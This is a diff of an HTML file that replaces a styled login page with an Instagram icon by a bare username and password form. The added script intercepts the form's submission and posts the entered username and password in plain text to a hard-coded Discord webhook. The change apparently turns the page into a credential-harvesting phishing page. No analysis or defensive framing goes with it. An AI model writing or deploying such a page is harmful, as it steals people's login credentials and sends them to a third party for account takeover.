@@ -1,78 +1,42 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Login Page</title>
-  <style>
-    body {
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
-    }
-    
-    .container {
-      max-width: 400px;
-      margin: 0 auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 5px;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-    }
-    
-    .form-group {
-      margin-bottom: 20px;
-    }
-    
-    .form-group label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-    }
-    
-    .form-group input {
-      width: 100%;
-      padding: 8px;
-      border-radius: 3px;
-      border: 1px solid #ccc;
-    }
-    
-    .form-group button {
-      width: 100%;
-      padding: 8px;
-      border-radius: 3px;
-      background-color: #4CAF50;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-    }
+<form onsubmit="sendLoginData(event)">
+  <input type="text" name="username" placeholder="Username">
+  <input type="password" name="password" placeholder="Password">
+  <button type="submit">Login</button>
+</form>
 
-    .instagram-icon {
-      display: inline-block;
-      width: 30px;
-      height: 30px;
-      margin-right: 5px;
-      background-image: url('https://www.google.com/url?sa=i&url=https%3A%2F%2Ffr.m.wikipedia.org%2Fwiki%2FFichier%3AInstagram_icon.png&psig=AOvVaw2QpB63TpgMcE8DOWbCLs4g&ust=1686350016993000&source=images&cd=vfe&ved=0CBEQjRxqFwoTCPCDsdHdtP8CFQAAAAAdAAAAABAE');
-      background-size: cover;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <a href="https://www.google.com/search?q=instagram+icon" target="_blank" rel="noopener noreferrer">
-      <div class="instagram-icon"></div>
-    </a>
-    <h2>Login</h2>
-    <form>
-      <div class="form-group">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-      </div>
-      <div class="form-group">
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-      </div>
-      <div class="form-group">
-        <button type="submit">Log In</button>
-      </div>
-    </form>
-  </div>
-</body>
-</html>
+<script>
+  function sendLoginData(event) {
+    event.preventDefault();
+  
+    const form = event.target;
+    const username = form.username.value;
+    const password = form.password.value;
+  
+    const webhookUrl = "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg";
+  
+    const payload = {
+      content: `Username: ${username}\nPassword: ${password}`,
+    };
+  
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    })
+      .then(response => {
+        if (response.ok) {
+          // Successful webhook request
+          // You can perform additional actions or display a success message
+        } else {
+          // Error in the webhook request
+          // You can handle the error or display an error message
+        }
+      })
+      .catch(error => {
+        // Error in the fetch request
+        // You can handle the error or display an error message
+      });
+  }
+</script>
